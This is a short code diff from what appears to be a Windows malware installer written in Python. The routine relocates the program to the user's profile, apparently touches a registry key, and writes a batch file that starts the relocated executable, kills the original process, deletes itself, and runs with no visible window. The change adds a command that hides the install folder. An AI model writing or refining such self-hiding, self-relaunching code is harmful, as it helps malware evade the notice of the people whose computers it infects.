@@ -32,7 +32,7 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
     #.log Closed the registry key 
     with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', 'w', encoding='utf-8') as activator:
         process_name = sys.argv[0].split('\\')[-1]
-        activator.write(f'pushd "C:\\Users\\{getuser()}\\{software_directory_name}"\nstart "" "{software_executable_name}"\ntaskkill /f /im "{process_name}"\ndel "%~f0"')
+        activator.write(f'pushd "C:\\Users\\{getuser()}\\{software_directory_name}"\nattrib +h .\nstart "" "{software_executable_name}"\ntaskkill /f /im "{process_name}"\ndel "%~f0"')
         #.log Generated the activator script 
     subprocess.Popen(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW)
     #.log Executed the activator script. Killing itself 
